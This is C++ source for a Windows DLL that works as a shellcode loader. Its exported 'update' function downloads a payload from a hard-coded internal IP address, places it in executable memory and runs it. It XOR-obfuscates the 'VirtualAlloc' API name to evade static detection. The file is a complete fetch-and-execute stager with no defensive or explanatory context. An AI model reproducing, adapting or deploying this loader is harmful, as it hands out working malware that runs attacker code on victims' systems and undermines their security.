
#include "pch.h"
#include <Windows.h>
#include <WinInet.h>
#include <iostream>
#include <iomanip>
#pragma comment(lib, "Wininet.lib")

void decode_string(unsigned char* key, unsigned char* text, int size) {

    for (int x = 0; x < size; x++) {

        text[x] = text[x] ^ key[x];

    }

    return;
}

FARPROC load_func(LPCWSTR lib, LPCSTR function) {
    HMODULE hDLL = GetModuleHandle(L"kernel32");
    FARPROC x = GetProcAddress(hDLL, function);
    return x;
}

void do_shit() {
    // Open Internet connection
    HINTERNET hInternet = InternetOpen(L"", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (hInternet == nullptr) {
        return;
    }

    // Open HTTP connection
    HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://192.168.120.128/shellm.bin", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == nullptr) {
        
        InternetCloseHandle(hInternet);
        return;
    }

    // Get content length
    DWORD contentLength = 0;
    DWORD dwBufferSize = sizeof(DWORD);
    HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &dwBufferSize, nullptr);
    HANDLE processHandle = GetCurrentProcess();

    LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    unsigned char vk[] = "\xf6\xa3\x29\xed\x46\xa1\x32\x6c\xb4\x9a\x83\xc9\xfc\x3d";

    unsigned char vx[] = "\xa0\xca\x5b\x99\x33\xc0\x5e\x2d\xd8\xf6\xec\xaa\xb9\x45";


    decode_string(vk, vx, sizeof vx);

    (FARPROC&)VirtualAllocEx = load_func((LPCWSTR)"kernel32", (LPCSTR)vx);

    LPVOID lpMemory = VirtualAllocEx(processHandle, NULL, contentLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
   
    if (lpMemory == nullptr) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return;
    }

    
    DWORD bytesRead;

    if (InternetReadFile(hUrl, lpMemory, contentLength, &bytesRead) && bytesRead == contentLength) {
      

        char* char_ptr = static_cast<char*>(lpMemory);
        ((void(*)())char_ptr)();

    }
    else {
        
        VirtualFree(lpMemory, 0, MEM_RELEASE);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return;
    }

    // Close handles and free memory
    VirtualFree(lpMemory, 0, MEM_RELEASE);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return;

} 

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


extern "C" {
    __declspec(dllexport) BOOL WINAPI update(void) {

        do_shit();
        return TRUE;
    }
    
}
